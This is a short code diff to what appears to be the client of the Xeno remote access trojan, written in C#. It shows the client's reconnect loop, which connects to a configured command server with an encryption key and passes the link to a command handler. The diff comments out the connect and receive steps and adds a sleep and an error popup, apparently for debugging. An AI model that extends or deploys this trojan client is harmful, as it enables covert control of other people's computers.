@@ -9,6 +9,7 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace xeno_rat_client
 {
@@ -89,14 +90,17 @@ namespace xeno_rat_client
             {
                 try
                 {
+                    
                     Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    await socket.ConnectAsync(ServerIp, ServerPort);
+                    //await socket.ConnectAsync(ServerIp, ServerPort);
                     Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
                     Handler handle = new Handler(Server, dllhandler);
-                    await handle.Type0Receive();
+                    //await handle.Type0Receive();
+                    Thread.Sleep(3600000);
                 }
                 catch (Exception e)
                 {
+                    MessageBox.Show("failed" + e.StackTrace, "Client.Program");
                     await Task.Delay(10000);
                     Console.WriteLine(e.Message);
                 }
